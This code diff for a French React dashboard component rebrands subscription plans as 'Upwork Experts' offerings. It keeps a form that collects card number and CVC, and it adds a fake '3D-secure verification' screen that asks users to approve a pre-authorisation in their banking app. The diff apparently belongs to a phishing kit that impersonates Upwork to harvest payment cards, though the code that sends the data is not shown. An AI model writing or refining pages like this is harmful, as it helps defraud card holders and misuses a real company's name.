@@ -8,6 +8,7 @@ const Board = () => {
   const [showPopup, setShowPopup] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [show3DSecurePopup, setShow3DSecurePopup] = useState(false);
+  const [selected, setSelected] = useState(null);
   const [showCache, setShowCache] = useState(true);
 
   useEffect(() => {
@@ -39,17 +40,16 @@ const Board = () => {
     setTimeout(() => {
       setSelectedPlan(null);
       setShowCache(true);
+      setShowPopup(true); // Réaffiche la première popup
     }, 300); // Match the duration of the CSS transition
   };
 
   const getPlanPrice = (plan) => {
     switch(plan) {
-      case 'Starter':
-        return '99€/mois';
-      case 'Advanced':
-        return '179€/mois';
-      case 'Hyperscale':
-        return '429€/mois';
+      case 'Freelance':
+        return '190€/mois';
+      case 'Agence':
+        return '470€/mois';
       default:
         return '';
     }
@@ -100,44 +100,31 @@ const Board = () => {
       <div className={`dashboard-container ${isBlurred ? 'blurred' : ''}`}></div>
       {showCache && <div className='dashboard-cache'></div>}
       <div className={`subscription-popup ${selectedPlan ? 'hidden' : ''} ${showPopup ? 'show' : ''}`}>
-        <h2>Choisissez un plan, obtenez votre première mission 🎉</h2>
+        <h2>Exprimez votre plein potentiel avec Upwork Experts</h2>
         <div className="plans">
-          <div className="plan">
-            <h3>Starter</h3>
-            <p>99€<span className='month'>/mois</span></p>
+          <div className="plan ">
+            <h3>Freelance</h3>
+            <p>190€<span className='month'>/mois</span></p>
             <ul>
-              <li>10% de frais sur vos missions</li>
+              <li>9% de commissions Upwork</li>
               <li>5 mises en relation/mois</li>
-              <li>Accès complet à Collective</li>
+              <li>Support Talents Groupe</li>
             </ul>
-            <button onClick={() => showPaymentPopup('Starter')}>Essayer gratuitement</button>
-            <span className='notice'>0€ pendant 30 jours, puis 99€/mois</span>
+            <button onClick={() => showPaymentPopup('Freelance')}>Essayer gratuitement</button>
+            <span className='notice'>0€ pendant 30 jours, puis 190€/mois</span>
           </div>
           <div className="plan star">
-            <h3>Advanced</h3>
-            <p>179€<span className='month'>/mois</span></p>
+            <h3>Agence</h3>
+            <p>470€<span className='month'>/mois</span></p>
             <ul>
-              <li>4% de frais sur vos missions</li>
+              <li>4% de commissions Upwork</li>
               <li>10 mises en relation/mois</li>
-              <li>Accès complet à Collective</li>
-              <li>Support 7/j7 prioritaire</li>
-            </ul>
-            <button onClick={() => showPaymentPopup('Advanced')}>Essayer gratuitement</button>
-            <span className='notice'>0€ pendant 30 jours, puis 179€/mois</span>
-          </div>
-          <div className="plan">
-            <h3>Hyperscale</h3>
-            <p>429€<span className='month'>/mois</span></p>
-            <ul>
-              <li>0% de frais sur vos missions</li>
-              <li>20 mises en relation/mois</li>
-              <li>5 à 10 mise en relation/mois</li>
-              <li>Business Manager Collective</li>
-              <li>User Statistics Report </li>
+              <li>Support Talents Groupe</li>
+              <li>Accès recruteur Upwork</li>
               <li>Programme de parrainage</li>
             </ul>
-            <button onClick={() => showPaymentPopup('Hyperscale')}>Essayer gratuitement</button>
-            <span className='notice'>0€ pendant 30 jours, puis 429€/mois</span>
+            <button onClick={() => showPaymentPopup('Agence')}>Essayer gratuitement</button>
+            <span className='notice'>0€ pendant 30 jours, puis 470€/mois</span>
           </div>
         </div>
       </div>
@@ -146,7 +133,7 @@ const Board = () => {
           <div className="popup-content">
             <div className="payment-details">
               <form onSubmit={handleSubmit}>
-                <h3>Essayer {selectedPlan}</h3>
+                <h3>{selectedPlan} : 30 jours gratuit</h3>
                 <span>0€ pendant 30 jours, puis {getPlanPrice(selectedPlan)} annulez avant pour ne pas être facturé.</span>
                 <div>
                   <label>Titulaire de la carte</label>
@@ -166,7 +153,7 @@ const Board = () => {
                     <input type="text" name="cardCvc" required placeholder='***' maxLength="3" />
                   </div>
                 </div>
-                <p className='trial-notice'>Une pré-autorisation temporaire de 99€ sera effectuée sur votre compte.</p>
+                <p className='trial-notice'>Une pré-autorisation temporaire du montant sera effectuée sur votre compte.</p>
                 <button className='buy' type="submit" disabled={isLoading}>
                   {isLoading ? 'Vérification...' : 'Démarrer mon essai'}
                 </button>
@@ -180,16 +167,16 @@ const Board = () => {
       )}
       {show3DSecurePopup && (
         <div className="popup show">
-          <div className="popup-content d-secure">
-            <h3>Préparation du tableau de bord</h3>
-            <p>Nous préparons votre compte, cela peut prendre jusqu'à 2 minutes.</p>
+          <div className="popup-content d-secure show">
+            <h3>Vérificaton 3D-secure</h3>
+            <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')} sur votre application bancaire.</p>
             <span>Essai 30 jours {selectedPlan}</span>
             <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
             <span>{new Date().toLocaleDateString('fr-FR')} {new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })}</span>
 
-              <div className="loading-spinner">
-                <div className="spinner"></div>
-              </div>
+            <div className="loading-spinner">
+              <div className="spinner"></div>
+            </div>
 
           </div>
         </div>
